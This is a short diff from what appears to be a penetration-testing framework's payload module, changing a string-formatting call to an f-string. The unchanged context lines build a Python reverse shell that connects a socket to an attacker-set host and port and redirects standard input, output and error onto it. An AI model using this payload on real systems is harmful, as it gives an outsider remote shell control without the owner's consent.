@@ -24,7 +24,7 @@ class Payload(ReverseTCPPayloadMixin, GenericPayload):
         return (
             "import socket,subprocess,os\n" +
             "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
-            "s.connect(('{}',{}))\n".format(self.lhost, self.lport) +
+            f"s.connect(('{self.lhost}',{self.lport}))\n" +
             "os.dup2(s.fileno(),0)\n" +
             "os.dup2(s.fileno(),1)\n" +
             "os.dup2(s.fileno(),2)\n" +
